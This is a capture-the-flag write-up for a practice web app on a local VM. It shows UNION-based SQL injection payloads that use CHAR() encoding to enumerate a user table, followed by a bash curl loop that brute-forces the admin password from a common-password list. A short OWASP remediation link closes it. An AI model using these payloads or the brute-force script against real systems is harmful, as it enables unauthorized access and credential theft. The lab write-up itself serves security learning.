# Brute Force

On [the member search page](http://192.168.56.101/?page=member) querying list of Databases name from Information Schema shows that the schema named **Member_Brute_Force** exists.

```sql
1 AND 1=1 UNION SELECT 1, table_schema FROM information_schema.tables
```
![Member_Brute_Force DB](https://user-images.githubusercontent.com/22397481/207932328-93288cf9-01dc-4155-8ae7-b2670c054f07.jpeg)

Knowing the name of the DB to use, *Member_Brute_Force*, next step is to determine table name.

The `WHERE` clause requires single quotes around text values but the request will resulnt in an error from the PHP.
```sql
1 and 1=1 UNION SELECT table_name, 2 FROM information_schema.tables WHERE table_schema='Member_Brute_Force'
```

To bypass that, `CHAR()` function can be used. First, the string needs to be converted to a set of ASCII values using Python.
```python
┌──$ [~/42/2022/darkly]
└─>  python -c 'print([ord(c) for c in "Member_Brute_Force"])' 
[77, 101, 109, 98, 101, 114, 95, 66, 114, 117, 116, 101, 95, 70, 111, 114, 99, 101]
```
Hence, SQL request will be following
```sql
1 AND 1=1 UNION SELECT table_name,2 FROM information_schema.tables WHERE table_schema=CHAR(77, 101, 109, 98, 101, 114, 95, 66, 114, 117, 116, 101, 95, 70, 111, 114, 99, 101)
```

by doing so, we can find `db_default` table in `Member_Brute_Force` schema:

<img width="1186" alt="image" src="https://user-images.githubusercontent.com/46742040/202880957-1ac03f76-c4e2-4c15-a9af-74c0bc92f5d8.png">

In order to take a look at the `db_default` table in `Member_Brute_Force` schema, following query needs to be executed, but as the php causes an error, it needs to be changed as well

```
#before
1 and 1=1 UNION SELECT column_name, 2 FROM information_schema.tables WHERE table_schema='Member_Brute_Force' and table_name='db_default'
#after
1 and 1=1 union select column_name, 2 from information_schema.columns where table_schema=CHAR(77, 101, 109, 98, 101, 114, 95, 66, 114, 117, 116, 101, 95, 70, 111, 114, 99, 101) and table_name=CHAR(100, 98, 95, 100, 101, 102, 97, 117, 108, 116)
```

By doing so, we can acknowledge there are four columns `id`, `username`, `password`

<img width="1223" alt="image" src="https://user-images.githubusercontent.com/46742040/202880932-0224ef49-d154-4254-ad4b-629b66adbf1c.png">

To check username in the `db_default` table, this query needs to be run

```
1 and 1=1 union select username,2 from Member_Brute_Force.db_default
```

Once we run the query, we know there are two users `admin`, and `root` exists for login.


Of course the password can be retrieved with sending a query to the `Member_Brute_Force` table, we can also try using the Brute Force Method. In order to do so, the following script can be run, with password in [here](./2020-200_most_used_passwords.txt), [2020-200-most_used_passwords.txt](https://github.com/danielmiessler/SecLists/blob/master/Passwords/2020-200_most_used_passwords.txt) from [SecLists](https://github.com/danielmiessler/SecLists)


```
$ cat 2020-200_most_used_passwords.txt| while read password; do flag=$(curl -L "http://{IP_ADDR}/?page=signin&username=admin&password=${password}&Login=Login" 2>/dev/null |  grep "flag" | wc -l); if [[ "${flag}" -eq 1 ]]; then echo "Success: The password is ${password}";break 2; fi; done

# if the password exists, the script will print out the password.
Success: The password is shadow

```

Loggin in with ID and password found, `id: admin, pw: shadow`, the token will be present.

<img width="1153" alt="image" src="https://user-images.githubusercontent.com/46742040/203154937-974c0553-fb11-48d0-b995-d1630767e5c3.png">


## Remediation
SQL Injection has become a common issue with database-driven web sites.

***
https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html
